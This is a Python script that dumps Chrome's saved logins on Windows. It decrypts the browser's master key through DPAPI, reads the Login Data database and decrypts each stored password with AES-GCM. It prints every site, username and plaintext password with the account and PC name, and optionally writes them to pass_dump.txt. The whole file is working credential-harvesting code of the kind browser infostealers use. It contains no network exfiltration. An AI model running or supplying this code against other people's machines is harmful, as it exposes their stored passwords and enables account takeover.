import json, base64, sqlite3, win32crypt, os
import Cryptodome.Cipher.AES as AES

def decrypt_password(cipher_text: bytes) -> str:
    global master_key
    init_vec = cipher_text[3:15]
    encrypted_password = cipher_text[15:-16]
    cipher = AES.new(master_key, AES.MODE_GCM, init_vec)
    decrypted_password = cipher.decrypt(encrypted_password)
    decrypted_password = decrypted_password.decode()
    return decrypted_password

def get_masterkey(path: str) -> bytes:
    try:
        with open(path, "r", encoding="utf-8") as f:
            t = f.read()
            j = json.loads(t)
            key = j["os_crypt"]["encrypted_key"]
            bdecoded = base64.b64decode(key)[5:]
            m_key = win32crypt.CryptUnprotectData(bdecoded, None, None, None, 0)[1]
        return m_key
    except:
        print("[Error] Couldnt read Local State file")
        exit(1)

def print_and_save_creds(decrypted_rows: list):
    save_path = os.getcwd() + '\\pass_dump.txt'
    username = os.environ['USERNAME']
    pcname = os.environ['USERDOMAIN']
    i = 0
    usr_f = f"Username: {username}    PC Name: {pcname}\n"
    print(usr_f, end="")

    save_file = 0
    c = str(input("Do you want to save the output? Y/n: "))
    if(c == "y" or c == "Y"):
        try:
            save_file = open(save_path, "w", encoding="utf-8")
        except Exception as e:
            print("[Error] Couldnt open save file, Error:",e)
    for row in decrypted_rows:
        row_f = f"\n{i} Website: {row['url']}\nUsername: {row['username']}\nPassword: {row['password']}"
        print(row_f)
        if(save_file != 0):
            save_file.write(f"\n{row_f}\0")
        i += 1
    if(save_file != 0):
        save_file.close()
        print("\n\n--- Saved to .\\pass_dump.txt ---")

# ---- ENTRY MAIN
if __name__ == "__main__":
    # Get Environment variables
    chrome_localstate_path = os.environ['APPDATA'] + '\\..\\Local\\Google\\Chrome\\User Data\\Local State'
    chrome_datafile_path = os.environ['APPDATA'] + '\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
    if os.path.exists(chrome_localstate_path) == False:
        print("[Error] Couldn't find Chrome Local State path!", chrome_localstate_path)
    if os.path.exists(chrome_datafile_path) == False:
        print("[Error] Couldn't find Chrome Login Data path!", chrome_datafile_path)
    # -------------

    master_key = get_masterkey(chrome_localstate_path)
    con = sqlite3.connect(chrome_datafile_path)
    cur = con.cursor()

    try:
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    except Exception as e:
        print("Couldnt oben sqlite3 db, error:", e)
        exit(1)
    rows = cur.fetchall()

    # return a list of credentials
    decrypted_rows = []
    for row in rows:
        cipher_text = row[2]
        decrypted_pass = decrypt_password(cipher_text)
        # Only append those entries with non empty passwords
        if len(decrypted_pass) > 0: 
            decrypted_rows.append({
                "url":row[0],
                "username":row[1],
                "password":decrypted_pass
            })
    con.close() # Close sqlite3 connection
    print_and_save_creds(decrypted_rows)
